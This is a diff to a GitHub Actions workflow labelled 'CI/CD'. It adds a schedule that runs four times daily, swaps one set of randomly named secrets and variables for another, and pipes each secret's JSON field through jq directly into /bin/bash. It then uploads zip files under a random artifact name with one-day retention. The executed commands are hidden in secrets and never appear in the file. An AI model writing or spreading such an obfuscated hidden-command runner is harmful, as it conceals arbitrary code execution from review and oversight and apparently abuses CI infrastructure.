@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '45 1,7,13,19 * * *'
 jobs:
   handler:
     runs-on: ubuntu-latest
@@ -10,15 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          rhpld717: ${{ secrets.rhpld717 }}
+          gw7: ${{ secrets.gw7 }}
         run: |
-          printf '%s' "$rhpld717" | jq -r .z92693 | /bin/bash
-          echo $s9421 | jq -r .smkxx0777 | /bin/bash
-          echo $w3982 | jq -r .xuj1459 | /bin/bash
+          printf '%s' "$gw7" | jq -r .jtx8 | /bin/bash
+          printf '%s' "$lt2" | jq -r .fqjd353 | /bin/bash
+          echo $etwab444 | jq -r .itgl6368 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: DtHRYpzu
+          name: qj4o2A74
           path: "*.zip"
           retention-days: 1
